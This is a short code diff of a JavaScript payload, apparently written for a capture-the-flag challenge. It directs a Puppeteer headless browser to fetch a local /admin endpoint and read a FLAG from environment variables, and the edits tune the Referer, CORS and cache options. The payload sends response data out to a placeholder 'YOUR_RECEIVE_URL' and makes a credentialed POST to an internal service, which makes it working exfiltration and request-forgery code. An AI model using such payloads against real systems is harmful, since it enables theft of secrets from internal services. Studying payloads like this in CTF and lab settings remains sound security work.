@@ -12,7 +12,13 @@
     // ###########################################################################
     const param = {"url":"http://127.0.0.1:3000/admin"};
     // 核心：访问/admin获取环境变量的FLAG，Puppeteer同域无跨域，直接解析JSON
-    fetch('http://127.0.0.1:3000/admin')
+    fetch('http://127.0.0.1:3000/admin',{
+         headers: { 
+        'Referer': 'http://127.0.0.1:3000'
+        },
+        mode: 'cors' ,
+        cache: 'no-cache'
+    })
         .then(res => {
             const respStatus = res.status;
              fetch(YOUR_RECEIVE_URL+'?respS-1='+respStatus);
@@ -52,10 +58,12 @@
       method: 'POST', // 必须指定为 POST
       headers: {
         'Content-Type': 'application/json', 
-        'Referer':'http://127.0.0.1'
+        'Referer':'http://127.0.0.1:3000'
       },
       body: JSON.stringify(param),
-      credentials: 'include'
+      credentials: 'include',
+      mode: 'cors',
+      cache: 'no-cache'
     })
         .then(res => {
             
